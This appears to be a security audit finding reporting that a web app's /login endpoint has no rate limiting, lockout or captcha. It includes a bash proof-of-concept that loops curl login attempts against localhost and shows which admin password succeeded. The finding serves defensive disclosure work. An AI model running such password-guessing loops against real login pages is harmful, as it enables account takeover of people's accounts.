# H12 — No Brute-Force Protection on `/login` (F-A2)

**Severity:** High  
**CWE:** CWE-307 | **OWASP:** A07:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-022-f-a2-no-login-rate-limit.md`

## Summary

`/login` has no rate limiting, no account lockout, no captcha. Source comment explicitly acknowledges the absence. Combined with plaintext password storage (C8), brute force with `rockyou.txt` finds the seed passwords in milliseconds.

## PoC

```bash
for pw in admin Admin@2024! password Password123; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:4443/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@thelocalplate.com\",\"password\":\"$pw\"}")
  echo "$pw -> $resp"
done
# admin -> 401
# Admin@2024! -> 200  <-- match
```
